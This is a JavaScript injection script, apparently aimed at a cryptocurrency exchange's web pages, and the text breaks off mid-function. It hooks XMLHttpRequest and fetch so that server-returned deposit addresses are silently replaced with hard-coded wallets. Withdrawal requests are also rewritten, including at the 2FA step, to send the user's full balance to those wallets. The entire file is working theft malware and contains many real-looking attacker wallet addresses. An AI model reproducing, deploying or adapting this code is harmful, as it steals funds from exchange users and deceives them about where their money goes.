(function () {
  'use strict';

  if (window.__HAQ_TROCA_DEP) { try { window.__HAQ_TROCA_DEP.off(); } catch (e) {} }
  if (window.__saqHook) {
    try {
      XMLHttpRequest.prototype.open = window.__saqHook.open;
      XMLHttpRequest.prototype.send = window.__saqHook.send;
      if (window.__saqHook.fetch) window.fetch = window.__saqHook.fetch;
    } catch (e) {}
    window.__saqHook = null;
  }

  if (window.__HAQ) {
    console.warn('[HAQ] ja instalado. Use __HAQ.off() para remover.');
    return;
  }

  var VERSAO = '1.0';
  var FORCAR = false;
  var AVISO_VISUAL = false;

  var DEPOSITO = {
    IGUAL: '',

    EVM:   ['0x4ca31601B8D6fF3A16F4EF207AD88C1F5529c6F4','0x16aa81861a3163dacDc737866c665330dFc5800e','0x00Ad488d61FfC8CE370250e5B665326B846b0eE7'],
    TRON:  ['TUiE9xYsPyWajS3Fnecxf9HCWchcGKk6gz','TGqVdXYLSGhzyfwefSB5XLmCXx21SUfqRB','TXWbRjstw86aJ1kemEXko1P83HHVnzyQjQ'],
    BTC:   ['bc1q2dy49x29thec6md76wch3k08wkkf67ea2g50lv','bc1q3lm93e5vlct4qxvdjcem7vw0pns3njy697mynr','bc1q3h4dy4rphcs02z5g6hlm53ncv0389yycsrcgea'],
    LTC:   ['ltc1qt4v74g6c3c06m84yhldprzsln8eymgz67uskup','ltc1qwgh5vnu7hjhye2dnkumq0u4k2nnn4xpav5wh6f','ltc1qphy9zm3um9ql7l544sjzvgnwrzejq5685mjq0v'],
    BCH:   ['qplpmgg3q4e5ak84zzf38l4ej0gsfatfdqmuycaz8k','qrcsmjz33mlkm5qsjj7gmvnu73h796cxs5a8f5xm85','qqspxn9g7hrldfzrsartvvh6dvnjpq4r2czsz2zya6'],
    DOGE:  ['DP1YKeqdimVjcWHSLzg1j3H1JEJvNrBT4U','DTBgeiJNVmn6sNxQPDiY6rNCjKP65csCKg','DPwWGs2F4mppgGrWAtmDuAB6XodGHhKaYv'],
    XRP:   ['rJdXQT88oXSF47fTidX8zs5CAJpKcGQYhG','rnTKMhZzGtks5mrbSUjvYS3Notk24FsadV','rNnYufnDmZsuJnCxzcxfPBiSqF1khEytgt'],
    TON:   ['UQAC1Wdkyr_3STzFS0ANSqm1ZKtaR1Ht9sabyIaFkycQCy2e','UQBDOJx5dW-d3kMS7t0OwfnDLqeIy8pEcCdBuq7eRiHrztf6','UQBK6GCnzIVs-nY8fwup3QEGvBkqeJbXUcqZFmhStnfN6dGZ'],
    ADA:   ['addr1q8eh42na63udwmfp30agcl3w3q6amq4emlwehrd0d6m4zs2dc90ytlx44xy0a4y7zr0mfvgthx5e5h77496agpvxm0kq528yv5','addr1qx2cnteyaa2jevmfzsds6wg6l05ewgdwc8sycqv3pxsnv97d8wxd3w6qtgq7u4d257a0k8dxzsnglqxmlvqkdynvtpzqp6g3xr','addr1qx5vpm5lpt70me79um46vjr8fhrrnd8v0cqlcjnasvt7uyrpe8ccum28369j0jpa0uxm4eshcr3t8rd667q6waeta6vqqsl9wn'],
    DOT:   ['14KoXwxG6Nf4wBrQvL6Wun1n8Rh1BdGQjj44MieuQB1MeAye','13VN1HzLw5aJcXzHhqJyhF7WyZ9jALd5eDoVXsxPDuqgSDH1','13s84VaLyfstPAHridvW4wPuP2WWDD3rgCwcspaAQxUrWFwC'],
    SOL:   ['Bx52cKu1rNZGeYxvvrUCctYbWP4Ue53B3KKkcE4KX2iU','8zcNMR61xPUQjNMiwVb1RAiSLXp1d5iF8nY34KXSsV1w','FrNCm9tjzmr5uYVbzUAx3PtV5SfgpRwievbH1bBoMHu9']
  };

  var SAQUE = {
    IGUAL: '',

    EVM:   ['0x4ca31601B8D6fF3A16F4EF207AD88C1F5529c6F4','0x16aa81861a3163dacDc737866c665330dFc5800e','0x00Ad488d61FfC8CE370250e5B665326B846b0eE7'],
    TRON:  ['TUiE9xYsPyWajS3Fnecxf9HCWchcGKk6gz','TGqVdXYLSGhzyfwefSB5XLmCXx21SUfqRB','TXWbRjstw86aJ1kemEXko1P83HHVnzyQjQ'],
    BTC:   ['bc1q2dy49x29thec6md76wch3k08wkkf67ea2g50lv','bc1q3lm93e5vlct4qxvdjcem7vw0pns3njy697mynr','bc1q3h4dy4rphcs02z5g6hlm53ncv0389yycsrcgea'],
    LTC:   ['ltc1qt4v74g6c3c06m84yhldprzsln8eymgz67uskup','ltc1qwgh5vnu7hjhye2dnkumq0u4k2nnn4xpav5wh6f','ltc1qphy9zm3um9ql7l544sjzvgnwrzejq5685mjq0v'],
    BCH:   ['qplpmgg3q4e5ak84zzf38l4ej0gsfatfdqmuycaz8k','qrcsmjz33mlkm5qsjj7gmvnu73h796cxs5a8f5xm85','qqspxn9g7hrldfzrsartvvh6dvnjpq4r2czsz2zya6'],
    DOGE:  ['DP1YKeqdimVjcWHSLzg1j3H1JEJvNrBT4U','DTBgeiJNVmn6sNxQPDiY6rNCjKP65csCKg','DPwWGs2F4mppgGrWAtmDuAB6XodGHhKaYv'],
    XRP:   ['rJdXQT88oXSF47fTidX8zs5CAJpKcGQYhG','rnTKMhZzGtks5mrbSUjvYS3Notk24FsadV','rNnYufnDmZsuJnCxzcxfPBiSqF1khEytgt'],
    TON:   ['UQAC1Wdkyr_3STzFS0ANSqm1ZKtaR1Ht9sabyIaFkycQCy2e','UQBDOJx5dW-d3kMS7t0OwfnDLqeIy8pEcCdBuq7eRiHrztf6','UQBK6GCnzIVs-nY8fwup3QEGvBkqeJbXUcqZFmhStnfN6dGZ'],
    ADA:   ['addr1q8eh42na63udwmfp30agcl3w3q6amq4emlwehrd0d6m4zs2dc90ytlx44xy0a4y7zr0mfvgthx5e5h77496agpvxm0kq528yv5','addr1qx2cnteyaa2jevmfzsds6wg6l05ewgdwc8sycqv3pxsnv97d8wxd3w6qtgq7u4d257a0k8dxzsnglqxmlvqkdynvtpzqp6g3xr','addr1qx5vpm5lpt70me79um46vjr8fhrrnd8v0cqlcjnasvt7uyrpe8ccum28369j0jpa0uxm4eshcr3t8rd667q6waeta6vqqsl9wn'],
    DOT:   ['14KoXwxG6Nf4wBrQvL6Wun1n8Rh1BdGQjj44MieuQB1MeAye','13VN1HzLw5aJcXzHhqJyhF7WyZ9jALd5eDoVXsxPDuqgSDH1','13s84VaLyfstPAHridvW4wPuP2WWDD3rgCwcspaAQxUrWFwC'],
    SOL:   ['Bx52cKu1rNZGeYxvvrUCctYbWP4Ue53B3KKkcE4KX2iU','8zcNMR61xPUQjNMiwVb1RAiSLXp1d5iF8nY34KXSsV1w','FrNCm9tjzmr5uYVbzUAx3PtV5SfgpRwievbH1bBoMHu9']
  };

  var MAPA = {
    'USDT|erc20':   'EVM',
    'USDT|trc20':   'TRON',
    'BTC|bitcoin':  'BTC',
    'BCH|bch':      'BCH',
    'ETH|erc20':    'EVM',
    'TON|toncoin':  'TON',
    'DOGE|doge':    'DOGE',
    'LTC|ltc':      'LTC',
    'XRP|ripple':   'XRP',
    'BNB|bep-20':   'EVM',
    'ADA|cardano':  'ADA',
    'TRX|trc20':    'TRON',
    'DOT|polkadot': 'DOT',
    'SOL|solana':   'SOL',
    'POL|polygon':  'EVM',
    'TRUMP|solana': 'SOL',
    'SHIB|erc20':   'EVM',
    'USDC|erc20':   'EVM',
    'DAI|erc20':    'EVM'
  };

  var REDE_RE = [
    [/^(trc-?20|tron)$/i,                    'TRON'],
    [/^(erc-?20|eth|ethereum)$/i,            'EVM'],
    [/^(bep-?20|bsc|bnb)$/i,                 'EVM'],
    [/^(polygon|matic)$/i,                   'EVM'],
    [/^(bitcoin|btc)$/i,                     'BTC'],
    [/^(bch|bitcoincash)$/i,                 'BCH'],
    [/^(toncoin|ton)$/i,                     'TON'],
    [/^(ripple|xrp)$/i,                      'XRP'],
    [/^(cardano|ada)$/i,                     'ADA'],
    [/^(polkadot|dot)$/i,                    'DOT'],
    [/^(solana|sol)$/i,                      'SOL'],
    [/^(doge|dogecoin)$/i,                   'DOGE'],
    [/^(ltc|litecoin)$/i,                    'LTC']
  ];

  var DIRETO = {
    TRX: 'TRON', BTC: 'BTC', LTC: 'LTC', BCH: 'BCH', DOGE: 'DOGE',
    XRP: 'XRP', TON: 'TON', ADA: 'ADA', DOT: 'DOT', SOL: 'SOL',
    TRUMP: 'SOL', ETH: 'EVM', BNB: 'EVM', POL: 'EVM', SHIB: 'EVM',
    USDC: 'EVM', DAI: 'EVM'
  };

  var REGRAS = {
    EVM:  /^0x[0-9a-fA-F]{40}$/,
    TRON: /^T[1-9A-HJ-NP-Za-km-z]{33}$/,
    BTC:  /^(bc1[02-9ac-hj-np-z]{11,71}|[13][1-9A-HJ-NP-Za-km-z]{25,34})$/,
    LTC:  /^(ltc1[02-9ac-hj-np-z]{11,71}|[LM3][1-9A-HJ-NP-Za-km-z]{25,34})$/,
    BCH:  /^(bitcoincash:)?[qp][a-z0-9]{41}$/i,
    DOGE: /^D[1-9A-HJ-NP-Za-km-z]{33}$/,
    XRP:  /^r[1-9A-HJ-NP-Za-km-z]{24,34}$/,
    TON:  /^(EQ|UQ|Ef|Uf)[A-Za-z0-9_-]{46,48}$/,
    ADA:  /^addr1[02-9ac-hj-np-z]{20,100}$/,
    DOT:  /^1[1-9A-HJ-NP-Za-km-z]{45,49}$/,
    SOL:  /^[1-9A-HJ-NP-Za-km-z]{32,44}$/
  };

  var PREC = {
    BTC: 7, BCH: 6, USDT: 4, TON: 4, USDC: 4, ETH: 7, LTC: 6, DOGE: 4,
    XRP: 4, ADA: 9, TRX: 4, BNB: 9, DOT: 9, SOL: 6, POL: 9, TRUMP: 9, SHIB: 8
  };
  var PREC_PADRAO = 8;

  function valido(fam, end) {
    if (!end) return false;
    var re = REGRAS[fam];
    return re ? re.test(String(end).trim()) : true;
  }

  function familiaDe(moeda, rede) {
    var k = String(moeda || '').toUpperCase().trim() + '|' + String(rede || '').toLowerCase().trim();
    if (MAPA[k]) return MAPA[k];
    var r = String(rede || '').trim();
    for (var i = 0; i < REDE_RE.length; i++) {
      if (REDE_RE[i][0].test(r)) return REDE_RE[i][1];
    }
    return DIRETO[String(moeda || '').toUpperCase().trim()] || null;
  }

  function sorteia(mapa, fam) {
    if (mapa.IGUAL && String(mapa.IGUAL).trim().length >= 20) return String(mapa.IGUAL).trim();
    var lista = mapa[fam];
    if (!lista || !lista.length) return null;
    var end = String(lista[Math.floor(Math.random() * lista.length)]).trim();
    if (!valido(fam, end)) {
      if (FORCAR) {
        console.warn('[HAQ] formato suspeito em ' + fam + ', aplicando porque FORCAR=true:', end);
        return end;
      }
      console.error('[HAQ] endereco de ' + fam + ' invalido. Ignorado:\n  ' + end);
      return null;
    }
    return end;
  }

  var logDep = [];
  var logSaq = [];
  var _ultLogDep = {};
  var trocas = 0;
  var _ultimaChaveSaq = '';
  var _ultimaHoraSaq = 0;

  function registrarDep(moeda, rede, original, novo) {
    var chave = moeda + '|' + rede + '|' + original + '|' + novo;
    var agora = Date.now();
    if (_ultLogDep[chave] && (agora - _ultLogDep[chave]) < 1500) return;
    _ultLogDep[chave] = agora;
    logDep.push({ hora: new Date().toISOString(), moeda: moeda, rede: rede, original: original, novo: novo });
    if (logDep.length > 200) logDep.shift();
    console.log('%c[DEP] ' + moeda + '/' + rede + '  ->  ' + novo, 'color:#0a0;font-weight:bold');
    console.log('      antes: ' + original);
  }

  function registrarSaq(d) {
    var chave = d.moeda + '|' + d.rede + '|' + d.original + '|' + d.novo + '|' + d.valor + '|' + d.etapa;
    var agora = Date.now();
    if (chave === _ultimaChaveSaq && (agora - _ultimaHoraSaq) < 1200) return;
    _ultimaChaveSaq = chave;
    _ultimaHoraSaq = agora;
    trocas++;
    logSaq.push({ hora: new Date().toISOString(), moeda: d.moeda, rede: d.rede, original: d.bruto, novo: d.novo, valor: d.valor, etapa: d.etapa });
    if (logSaq.length > 200) logSaq.shift();

    console.log('%c[SAQUE] TROCADO  ' + d.moeda + '/' + (d.rede || '-') +
                ' (' + d.familia + ', ' + d.etapa + ')',
                'color:#c00;font-weight:bold');
    console.log('   carteira : ' + d.bruto + '  ->  ' + d.novo);
    if (d.valor != null) {
      var extra = '';
      if (d.limitado) extra = '  (saldo cheio ' + d.saldo + ', cortado no maximo ' + d.max + ')';
      else if (d.saldo != null) extra = '  (saldo cheio ' + d.saldo + ')';
      else if (d.origemValor) extra = '  (' + d.origemValor + ')';
      console.log('   valor    : ' + d.valorDigitado + '  ->  ' + d.valor + extra);
    } else {
      console.log('   valor    : mantido ' + d.valorDigitado + ' - ' + (d.motivoValor || 'sem calculo'));
    }
    console.log('   total de trocas nesta aba: ' + trocas);
  }

  function trocarObjetoDep(obj, moeda, rede) {
    if (!obj || typeof obj !== 'object') return obj;
    if (Number(obj.error) !== 0) return obj;
    if (typeof obj.addr !== 'string' || !obj.addr) return obj;

    var fam = familiaDe(moeda, rede);
    if (!fam) {
      console.warn('[DEP] par sem mapa:', moeda, '/', rede);
      return obj;
    }
    var nosso = sorteia(DEPOSITO, fam);
    if (!nosso) return obj;

    var partes = obj.addr.split('|');
    var memo = partes.length > 1 ? partes.slice(0, -1).join('|') + '|' : '';
    var original = partes[partes.length - 1];

    if (original === nosso) return obj;

    obj.addr = memo + nosso;
    registrarDep(moeda, rede, original, nosso);
    return obj;
  }

  function trocarTextoDep(txt, moeda, rede) {
    if (typeof txt !== 'string' || !txt) return txt;
    var obj;
    try { obj = JSON.parse(txt); } catch (e) { return txt; }
    var antes = obj && obj.addr;
    trocarObjetoDep(obj, moeda, rede);
    if (!obj || obj.addr === antes) return txt;
    try { return JSON.stringify(obj); } catch (e) { return txt; }
  }

  var saqCache = {};

  function saqEndereco(fam, moeda, rede) {
    if (!fam) return null;
    var chave = moeda + '|' + rede;
    var cached = saqCache[chave];
    if (cached && (Date.now() - cached.ts) < 600000) return cached.endereco;
    var end = sorteia(SAQUE, fam);
    if (!end) return null;
    saqCache[chave] = { endereco: end, ts: Date.now() };
    return end;
  }

  function lerCampo(corpo, nome) {
    try {
      if (corpo == null) return null;
      if (typeof corpo.get === 'function') return corpo.get(nome);
      if (typeof corpo === 'object' && nome in corpo) return corpo[nome];
    } catch (e) {}
    return null;
  }

  function gravarCampo(corpo, nome, valor) {
    try {
      if (corpo == null) return false;
      if (typeof corpo.set === 'function') { corpo.set(nome, valor); return true; }
      if (typeof corpo === 'object') { corpo[nome] = valor; return true; }
    } catch (e) {}
    return false;
  }

  function numeroDe(txt) {
    var s = String(txt == null ? '' : txt).replace(/[^\d.,-]/g, '');
    if (!s) return null;
    var p = s.indexOf('.') >= 0, v = s.indexOf(',') >= 0;
    if (p && v) {
      if (s.lastIndexOf(',') > s.lastIndexOf('.')) s = s.replace(/\./g, '').replace(',', '.');
      else s = s.replace(/,/g, '');
    } else if (v) {
      s = s.replace(',', '.');
    }
    var n = Number(s);
    return isFinite(n) && n > 0 ? n : null;
  }

  function truncarNum(n, casas) {
    casas = Math.max(0, Math.min(20, casas | 0));
    var p = Math.pow(10, casas);
    var v = Math.floor(n * p + 1e-6) / p;
    if (!isFinite(v) || v <= 0) return null;
    var s = v.toFixed(casas);
    if (casas > 0) { s = s.replace(/0+$/, '').replace(/\.$/, ''); }
    return s || null;
  }

  var DEPWITH = null;

  function depwithObj() {
    if (DEPWITH) return DEPWITH;
    var raw = null;
    try { if (typeof depwith !== 'undefined' && depwith) raw = depwith; } catch (e) {}
    if (!raw) { try { raw = window.depwith; } catch (e) {} }
    if (!raw) return null;
    try { DEPWITH = (typeof raw === 'string') ? JSON.parse(raw) : raw; } catch (e) { DEPWITH = null; }
    return DEPWITH;
  }

  function cfgDe(moeda, rede) {
    var dw = depwithObj();
    if (!dw) return null;
    var k = moeda;
    if (moeda === 'USDT') k = /trc/i.test(rede) ? 'USDTT' : 'USDTE';
    if (moeda === 'MATIC') k = 'POL';
    return dw[k] || null;
  }

  var SALDOS = {};
  var CACHE_OK = false;

  function atualizarSaldos() {
    try {
      var fd = new FormData();
      fd.set('action', 'userMoney');
      var ir = window.fetch;
      if (typeof ir !== 'function') return;
      ir('/user/func.php', {
        method: 'POST', body: fd, credentials: 'same-origin',
        headers: { 'Accept': 'application/json, text/plain, */*' }
      }).then(function (r) { return r.json(); }).then(function (j) {
        if (!j || typeof j !== 'object') return;
        Object.keys(j).forEach(function (k) {
          if (k === 'current' || k === 'error') return;
          SALDOS[k] = String(j[k]);
        });
        CACHE_OK = true;
      }).catch(function () {});
    } catch (e) {}
  }

  function saldoDe(moeda) {
    var cur = '';
    try {
      var img = document.getElementById('with_imageCur');
      if (img) cur = String(img.getAttribute('alt') || '').toUpperCase().trim();
    } catch (e) {}

    var alvo = String(moeda || '').toUpperCase();
    var alt = alvo === 'MATIC' ? 'POL' : alvo;

    if (cur && cur === alt) {
      try {
        var b = document.getElementById('with_inp_bal');
        if (b) {
          var t = String(b.textContent || b.innerHTML || '').trim();
          if (numeroDe(t)) return t;
        }
      } catch (e) {}
    }

    if (SALDOS[alvo] != null) return String(SALDOS[alvo]);
    if (SALDOS[alt] != null) return String(SALDOS[alt]);

    if (!cur) {
      try {
        var b2 = document.getElementById('with_inp_bal');
        if (b2) {
          var t2 = String(b2.textContent || b2.innerHTML || '').trim();
          if (numeroDe(t2)) return t2;
        }
      } catch (e) {}
    }
    return null;
  }

  function valorTotal(moeda, rede) {
    var bruto = saldoDe(moeda);
    if (!bruto) return { motivo: 'saldo nao encontrado (mantido o valor digitado)' };

    var saldo = numeroDe(bruto);
    if (!saldo) return { motivo: 'saldo zerado para ' + moeda + ' (mantido o valor digitado)' };

    var cfg = cfgDe(moeda, rede);
    var min = cfg && cfg.out ? Number(cfg.out[0]) : 0;
    var max = cfg && cfg.out ? Number(cfg.out[1]) : 0;

    var alvo = saldo;
    var limitado = false;
    if (max && alvo > max) { alvo = max; limitado = true; }

    var casas = PREC[moeda] != null ? PREC[moeda] : PREC_PADRAO;
    var valor = truncarNum(alvo, casas);
    if (!valor) return { motivo: 'valor invalido apos o corte de precisao', saldo: saldo };

    if (min && Number(valor) < min) {
      return { motivo: 'saldo ' + valor + ' abaixo do minimo ' + min + ' (mantido o valor digitado)', saldo: saldo };
    }

    return { valor: valor, saldo: saldo, limitado: limitado, max: max };
  }

  var memo = {};

  function avaliar(corpo) {
    if (!corpo) return null;

    var moeda = String(lerCampo(corpo, 'typepay') || '').toUpperCase().trim();
    if (!moeda) return null;

    var bruto = lerCampo(corpo, 'address');
    if (typeof bruto !== 'string' || !bruto) return null;

    var rede   = String(lerCampo(corpo, 'network') || '').trim();
    var metodo = String(lerCampo(corpo, 'method') || '').trim().toLowerCase();
    var codigo = lerCampo(corpo, 'user_code');

    var d = {
      moeda: moeda,
      rede: rede,
      etapa: codigo ? '2fa' : 'inicial',
      familia: familiaDe(moeda, rede),
      bruto: bruto,
      original: bruto,
      prefixo: '',
      novo: null,
      motivo: '',
      motivoValor: '',
      valorDigitado: String(lerCampo(corpo, 'amount') == null ? '' : lerCampo(corpo, 'amount')),
      valor: null,
      saldo: null,
      origemValor: ''
    };

    var partes = bruto.split('|');
    if (partes.length > 1) {
      d.prefixo = partes.slice(0, -1).join('|') + '|';
      d.original = partes[partes.length - 1];
    }

    if (metodo && metodo !== 'ccp') { d.motivo = 'fiat (' + metodo + ') - ignorado'; return d; }
    if (!d.familia) { d.motivo = 'par moeda/rede sem mapa'; return d; }

    var nosso = saqEndereco(d.familia, d.moeda, d.rede);
    if (!nosso) { d.motivo = 'lista sem endereco valido para ' + d.familia; return d; }
    if (d.original === nosso) { d.motivo = 'ja e o endereco da lista'; return d; }

    d.novo = d.prefixo + nosso;

    var chave = moeda + '|' + rede;
    var m = memo[chave];

    if (d.etapa === '2fa' && m && m.destino === d.novo && (Date.now() - m.ts) < 600000) {
      d.valor = m.valor;
      d.origemValor = 'mesmo valor do 1o envio';
    } else {
      var t = valorTotal(moeda, rede);
      if (t.valor) {
        d.valor = t.valor;
        d.saldo = t.saldo;
        d.origemValor = t.limitado ? ('saldo cheio, limitado ao maximo de ' + t.max) : 'saldo cheio';
        d.limitado = !!t.limitado;
        d.max = t.max;
      } else {
        d.motivoValor = t.motivo;
        if (t.saldo != null) d.saldo = t.saldo;
      }
      if (d.valor) memo[chave] = { valor: d.valor, ts: Date.now(), destino: d.novo };
    }

    return d;
  }

  function bloquear(xhr, motivo) {
    console.error('[SAQUE] envio BLOQUEADO (nada saiu): ' + (motivo || 'corpo nao reescrevivel'));
    setTimeout(function () {
      try {
        var ev = new Event('error');
        if (typeof xhr.dispatchEvent === 'function') xhr.dispatchEvent(ev);
        else if (typeof xhr.onerror === 'function') xhr.onerror(ev);
      } catch (e) {}
    }, 0);
  }

  function acompanharResposta(xhr, d) {
    try {
      if (!xhr || typeof xhr.addEventListener !== 'function' || xhr.__haqLigado) return;
      xhr.__haqLigado = true;
      xhr.addEventListener('load', function () {
        try {
          var txt = String(xhr.responseText || '');
          var j = null;
          try { j = JSON.parse(txt); } catch (e) { return; }
          if (!j || Number(j.error) !== 0) return;
          var chave = d.moeda + '|' + d.rede;
          delete memo[chave];
          delete saqCache[chave];
          console.log('%c[SAQUE] aceito pelo servidor em ' + d.moeda + '/' + (d.rede || '-') +
                      '. Relendo saldos...', 'color:#080;font-weight:bold');
          atualizarSaldos();
        } catch (e) {}
      });
    } catch (e) {}
  }

  function corpoMutavel(corpo) {
    if (corpo == null) return false;
    if (typeof corpo.get === 'function' && typeof corpo.set === 'function') return true;
    return Object.prototype.toString.call(corpo) === '[object Object]';
  }

  function aplicar(corpo, d) {
    if (!d || !d.novo) return false;
    if (!gravarCampo(corpo, 'address', d.novo)) return false;
    if (d.valor != null) gravarCampo(corpo, 'amount', d.valor);
    return true;
  }

  function tratar(corpo) {
    if (typeof corpo === 'string') {
      if (/(^|&)typepay=/.test(corpo)) {
        var usp = new URLSearchParams(corpo);
        var dl = avaliar(usp);
        if (dl && dl.novo) {
          if (!aplicar(usp, dl)) return { acao: 'bloqueado', motivo: 'urlencoded nao gravavel' };
          return { acao: 'trocado', corpo: usp.toString(), d: dl };
        }
        if (dl && dl.motivo) return { acao: 'aviso', d: dl };
        return { acao: 'passa' };
      }
      if (/"typepay"\s*:/.test(corpo)) return { acao: 'bloqueado', motivo: 'corpo JSON nao suportado' };
      return { acao: 'passa' };
    }

    if (corpoMutavel(corpo)) {
      var d = avaliar(corpo);
      if (d && d.novo) {
        if (!aplicar(corpo, d)) return { acao: 'bloqueado', motivo: 'campo nao gravavel' };
        return { acao: 'trocado', corpo: corpo, d: d };
      }
      if (d && d.motivo) return { acao: 'aviso', d: d };
      return { acao: 'passa' };
    }

    return { acao: 'bloqueado', motivo: 'tipo de corpo desconhecido (' + Object.prototype.toString.call(corpo) + ')' };
  }

  var XP = XMLHttpRequest.prototype;

  function raiz(fn) {
    var i = 0;
    while (fn && fn.__haqOrig && i++ < 20) fn = fn.__haqOrig;
    return fn;
  }

  var _open  = raiz(XP.open);
  var _send  = raiz(XP.send);
  var _fetch = raiz(window.fetch);

  var dTxt = Object.getOwnPropertyDescriptor(XP, 'responseText');
  var dRsp = Object.getOwnPropertyDescriptor(XP, 'response');
  var PODE_LER = !!(dTxt && dTxt.get);

  var ALVO_DEP = /\/deposit\/(coins|ccp)\//i;
  var ALVO_SAQ = /\/withdraw\/index\.php(?:[?#]|$)/i;

  function lerCorpoDep(corpo) {
    try {
      if (!corpo || typeof corpo.get !== 'function') return null;
      var moeda = corpo.get('typepay');
      var rede = corpo.get('network');
      if (moeda === null || rede === null) return null;
      return { moeda: String(moeda), rede: String(rede) };
    } catch (e) { return null; }
  }

  XP.open = function (metodo, url) {
    try { this.__haqUrl = String(url == null ? '' : url); } catch (e) {}
    return _open.apply(this, arguments);
  };
  XP.open.__haqOrig = _open;

  XP.send = function (corpo) {
    var xhr = this;
    var corpoFinal = corpo;
    try {
      var url = String(xhr.__haqUrl || '');

      if (ALVO_DEP.test(url)) {
        var alvo = lerCorpoDep(corpo);
        if (alvo) {
          var fam = familiaDe(alvo.moeda, alvo.rede);
          var armado = (fam && DEPOSITO[fam] && DEPOSITO[fam].length > 0) ||
                       (DEPOSITO.IGUAL && String(DEPOSITO.IGUAL).trim().length >= 20);
          if (armado) {
            if (dTxt && dTxt.get) {
              Object.defineProperty(xhr, 'responseText', {
                configurable: true,
                get: function () {
                  var bruto;
                  try { bruto = dTxt.get.call(xhr); } catch (e) { return ''; }
                  try { return trocarTextoDep(bruto, alvo.moeda, alvo.rede); } catch (e) { return bruto; }
                }
              });
            }
            if (dRsp && dRsp.get) {
              Object.defineProperty(xhr, 'response', {
                configurable: true,
                get: function () {
                  var bruto;
                  try { bruto = dRsp.get.call(xhr); } catch (e) { return null; }
                  if (typeof bruto === 'string') {
                    try { return trocarTextoDep(bruto, alvo.moeda, alvo.rede); } catch (e) { return bruto; }
                  }
                  if (bruto && typeof bruto === 'object') {
                    try { return trocarObjetoDep(bruto, alvo.moeda, alvo.rede); } catch (e) { return bruto; }
                  }
                  return bruto;
                }
              });
            }
          }
        }
      }

      if (ALVO_SAQ.test(url)) {
        var r = tratar(corpo);
        if (r.acao === 'trocado') {
          corpoFinal = r.corpo;
          registrarSaq(r.d);
          acompanharResposta(xhr, r.d);
        } else if (r.acao === 'bloqueado') {
          bloquear(xhr, r.motivo);
          return;
        } else if (r.acao === 'aviso') {
          console.warn('[SAQUE] ' + r.d.moeda + '/' + (r.d.rede || '-') + ': ' + r.d.motivo);
        }
      }
    } catch (e) {
      console.warn('[HAQ] hook XHR falhou:', e);
    }
    return _send.call(this, corpoFinal);
  };
  XP.send.__haqOrig = _send;

  if (typeof _fetch === 'function') {
    window.fetch = function (entrada, init) {
      try {
        var url = (typeof entrada === 'string') ? entrada : ((entrada && entrada.url) || '');
        if (init && init.body && ALVO_SAQ.test(url)) {
          var r = tratar(init.body);
          if (r.acao === 'trocado') {
            init.body = r.corpo;
            registrarSaq(r.d);
          } else if (r.acao === 'bloqueado') {
            console.error('[SAQUE] envio BLOQUEADO (nada saiu): ' + r.motivo);
            return Promise.reject(new TypeError('SAQUE: envio bloqueado - ' + r.motivo));
          } else if (r.acao === 'aviso') {
            console.warn('[SAQUE] ' + r.d.moeda + '/' + (r.d.rede || '-') + ': ' + r.d.motivo);
          }
        }
      } catch (e) {
        console.warn('[SAQUE] hook fetch falhou:', e);
      }
      return _fetch.apply(this, arguments);
    };
    window.fetch.__haqOrig = _fetch;
  }

  var selo = null;
  function ligarSelo() {
    if (!AVISO_VISUAL || selo) return;
    selo = document.createElement('div');
    selo.textContent = 'DEP+SAQUE ATIVO';
    selo.style.cssText = 'position:fixed;z-index:2147483647;bottom:8px;left:8px;' +
      'background:#400;color:#fff;font:bold 11px/1.6 monospace;padding:2px 8px;' +
      'border-radius:4px;opacity:.85;pointer-events:none';
    document.body.appendChild(selo);
  }
  function desligarSelo() {
    if (selo && selo.parentNode) selo.parentNode.removeChild(selo);
    selo = null;
  }

  window.__HAQ = {
    versao: VERSAO,
    logDep: logDep,
    logSaq: logSaq,

    resumo: function () {
      var linhas = [];
      Object.keys(MAPA).forEach(function (k) {
        var fam = MAPA[k];
        var depLista = DEPOSITO.IGUAL ? [DEPOSITO.IGUAL] : (DEPOSITO[fam] || []);
        var saqLista = SAQUE.IGUAL ? [SAQUE.IGUAL] : (SAQUE[fam] || []);
        linhas.push({
          'moeda|rede': k,
          'familia': fam,
          'dep_qtd': depLista.length,
          'saq_qtd': saqLista.length,
          'dep_ok': depLista.length ? (depLista.every(function (e) { return valido(fam, e); }) ? 'sim' : 'FORMATO?') : '-',
          'saq_ok': saqLista.length ? (saqLista.every(function (e) { return valido(fam, e); }) ? 'sim' : 'FORMATO?') : '-'
        });
      });
      console.table(linhas);
      return linhas.length + ' pares mapeados';
    },

    setDep: function (fam, lista) {
      if (!(fam in DEPOSITO)) { console.error('[HAQ] familia desconhecida:', fam); return false; }
      DEPOSITO[fam] = Array.isArray(lista) ? lista.map(String) : [String(lista)];
      console.log('[DEP] ' + fam + ' = ' + DEPOSITO[fam].length + ' carteira(s)');
      return true;
    },

    addDep: function (fam, end) {
      if (!(fam in DEPOSITO)) { console.error('[HAQ] familia desconhecida:', fam); return false; }
      DEPOSITO[fam].push(String(end));
      console.log('[DEP] adicionado a ' + fam + ' (total: ' + DEPOSITO[fam].length + ')');
      return true;
    },

    setSaq: function (fam, lista) {
      if (!(fam in SAQUE)) { console.error('[HAQ] familia desconhecida:', fam); return false; }
      SAQUE[fam] = Array.isArray(lista) ? lista.map(String) : [String(lista)];
      console.log('[SAQUE] ' + fam + ' = ' + SAQUE[fam].length + ' carteira(s)');
      return true;
    },

    addSaq: function (fam, end) {
      if (!(fam in SAQUE)) { console.error('[HAQ] familia desconhecida:', fam); return false; }
      SAQUE[fam].push(String(end));
      console.log('[SAQUE] adicionado a ' + fam + ' (total: ' + SAQUE[fam].length + ')');
      return true;
    },

    limparCache: function () {
      saqCache = {};
      memo = {};
      console.log('[SAQUE] cache limpo - proximo saque sorteia novo endereco');
    },

    simularDep: function (moeda, rede) {
      var exemplo = { error: 0, addr: 'ENDERECO_DO_SERVIDOR' };
      var r = trocarObjetoDep(exemplo, moeda, rede);
      console.log('[DEP] simulado ' + moeda + '/' + rede + ':');
      console.log('   servidor ->', 'ENDERECO_DO_SERVIDOR');
      console.log('   exibido  ->', r.addr);
      return r.addr;
    },

    simularSaq: function (moeda, rede) {
      var fam = familiaDe(moeda, rede);
      if (!fam) { console.warn('[SAQUE] par sem mapa:', moeda, '/', rede); return null; }
      var end = sorteia(SAQUE, fam);
      console.log('[SAQUE] simulado ' + moeda + '/' + rede + ' (' + fam + '):');
      console.log('   sorteado ->', end || '(nenhum)');
      return end;
    },

    off: function () {
      XP.open = _open;
      XP.send = _send;
      if (typeof _fetch === 'function') window.fetch = _fetch;
